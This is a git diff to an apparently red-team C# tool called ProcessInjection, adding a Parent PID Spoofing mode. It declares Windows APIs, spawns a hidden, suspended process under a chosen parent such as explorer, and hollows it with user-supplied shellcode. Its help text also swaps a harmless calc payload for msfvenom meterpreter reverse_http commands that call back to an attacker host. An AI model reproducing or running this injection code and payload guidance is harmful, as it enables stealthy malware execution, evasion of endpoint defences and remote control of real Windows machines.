@@ -2,7 +2,6 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Diagnostics;
@@ -72,6 +71,27 @@ namespace ProcessInjection
         static extern uint GetLastError();
         #endregion Process Hollowing
 
+        #region Parent PID Spoofing
+        [DllImport("kernel32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+        #endregion Parent PID Spoofing
+
         //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
         public enum ProcessAccessRights
         {
@@ -127,6 +147,32 @@ namespace ProcessInjection
             SUSPEND_RESUME = 0x0002,
         }
 
+        #region Parent PID Spoofing Structs and flags
+        // Parent PID Spoofing flags - https://www.pinvoke.net/default.aspx/kernel32.sethandleinformation
+        enum HANDLE_FLAGS : uint
+        {
+            None = 0,
+            INHERIT = 1,
+            PROTECT_FROM_CLOSE = 2
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            [MarshalAs(UnmanagedType.Bool)]
+            public bool bInheritHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+        #endregion Parent PID Spoofing structs and flags
+
         #region Process Hollowing Structs
         [StructLayout(LayoutKind.Sequential)]
         public struct PROCESS_INFORMATION
@@ -149,7 +195,8 @@ namespace ProcessInjection
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct STARTUPINFO
+        //internal struct STARTUPINFO
+        public struct STARTUPINFO
         {
             uint cb;
             IntPtr lpReserved;
@@ -162,8 +209,8 @@ namespace ProcessInjection
             uint dwXCountChars;
             uint dwYCountChars;
             uint dwFillAttributes;
-            uint dwFlags;
-            ushort wShowWindow;
+            public uint dwFlags;
+            public ushort wShowWindow;
             ushort cbReserved;
             IntPtr lpReserved2;
             IntPtr hStdInput;
@@ -590,6 +637,105 @@ namespace ProcessInjection
 
         }
 
+        public class ParentPidSpoofing
+        {
+            // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
+            
+            public int SearchForPPID(string process)
+            {
+                int pid = 0;
+                int session = Process.GetCurrentProcess().SessionId;
+                Process[] allprocess = Process.GetProcessesByName(process);
+
+                try
+                {
+                    foreach(Process proc in allprocess)
+                    {
+                        if (proc.SessionId == session)
+                        {
+                            pid = proc.Id;
+                            Console.WriteLine($"[+] Parent process ID found: {pid}.");
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
+                    Console.WriteLine(ex.Message);
+                }
+                return pid;
+            }
+
+            public static PROCESS_INFORMATION ParentSpoofing(int parentID, string childPath)
+            {
+                // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
+                const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+                const int STARTF_USESTDHANDLES = 0x00000100;
+                const int STARTF_USESHOWWINDOW = 0x00000001;
+                const ushort SW_HIDE = 0x0000;
+                const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+                const uint CREATE_NO_WINDOW = 0x08000000;
+                const uint CreateSuspended = 0x00000004;
+
+                var pInfo = new PROCESS_INFORMATION();
+                var siEx = new STARTUPINFOEX();
+
+                IntPtr lpValueProc = IntPtr.Zero;
+                IntPtr hSourceProcessHandle = IntPtr.Zero;
+                var lpSize = IntPtr.Zero;
+
+                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
+
+                IntPtr parentHandle = OpenProcess((uint)ProcessAccessRights.CreateProcess | (uint)ProcessAccessRights.DuplicateHandle, false, (uint)parentID);
+                Console.WriteLine($"[+] Handle {parentHandle} opened for parent process id.");
+
+                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValueProc, parentHandle);
+
+                UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                Console.WriteLine($"[+] Adding attributes to a list.");
+
+                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+                siEx.StartupInfo.wShowWindow = SW_HIDE;
+
+                var ps = new SECURITY_ATTRIBUTES();
+                var ts = new SECURITY_ATTRIBUTES();
+                ps.nLength = Marshal.SizeOf(ps);
+                ts.nLength = Marshal.SizeOf(ts);
+
+               try
+                {
+                    bool ProcCreate = CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
+                    if (!ProcCreate)
+                    {
+                        Console.WriteLine($"[!] Proccess failed to execute!");
+
+                    }
+                    Console.WriteLine($"[!] New process with ID: {pInfo.dwProcessId} created in a suspended stated under the defined parent process.");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
+                    Console.WriteLine(ex.Message);
+                }
+                return pInfo;
+            }
+
+            public void PPidSpoof(string binary, byte[] shellcode, int parentpid)
+            {
+                PROCESS_INFORMATION pinf = ParentSpoofing(parentpid, binary);
+                ProcHollowing hollow = new ProcHollowing();
+                hollow.CreateSection((uint)shellcode.Length);
+                hollow.FindEntry(pinf.hProcess);
+                hollow.SetLocalSection((uint)shellcode.Length);
+                hollow.CopyShellcode(shellcode);
+                hollow.MapAndStart(pinf);
+                CloseHandle(pinf.hThread);
+                CloseHandle(pinf.hProcess);
+            }
+        }
 
         public static void logo()
         {
@@ -616,8 +762,9 @@ namespace ProcessInjection
     1) Vanila Process Injection
     2) DLL Injection
     3) Process Hollowing
+    4) Parent PID Spoofing
 
-[+] Vanila Process Injection and Process Hollowing
+[+] Vanila Process Injection, Process Hollowing and Parent PID Spoofing
 [+] Currently the program accepts shellcode in 3 formats 
     1) base64
     2) hex
@@ -642,8 +789,13 @@ namespace ProcessInjection
 
 [+] Process Hollowing
 [+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
+[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
 [+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
+
+[+] Parent PID Spoofing
+[+] Generating shellcode in c format and injecting it in the target process.
+[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
+[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
 
 ";
             Console.WriteLine(help);
@@ -739,6 +891,32 @@ namespace ProcessInjection
                             ProcHollowing prochollow = new ProcHollowing();
                             prochollow.Hollow(arguments["/ppath"], buf);
                         }
+                        else if (arguments["/t"]  == "4")
+                        {
+                            ParentPidSpoofing Parent = new ParentPidSpoofing();
+                            string ppid = null;
+                            int parentProc = 0;
+                            ppid = Convert.ToString(arguments["/parentproc"]);
+                            parentProc = Parent.SearchForPPID(ppid);
+
+                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            byte[] buf = new byte[] { };
+                            if (arguments["/f"] == "base64")
+                            {
+                                buf = Convert.FromBase64String(shellcode);
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                buf = StringToByteArray(shellcode);
+                            }
+                            else if (arguments["/f"] == "c")
+                            {
+                                buf = convertfromc(shellcode);
+                            }
+
+                            Parent.PPidSpoof(arguments["/ppath"], buf, parentProc);
+                        }
+                        
                     }
                     else
                     {
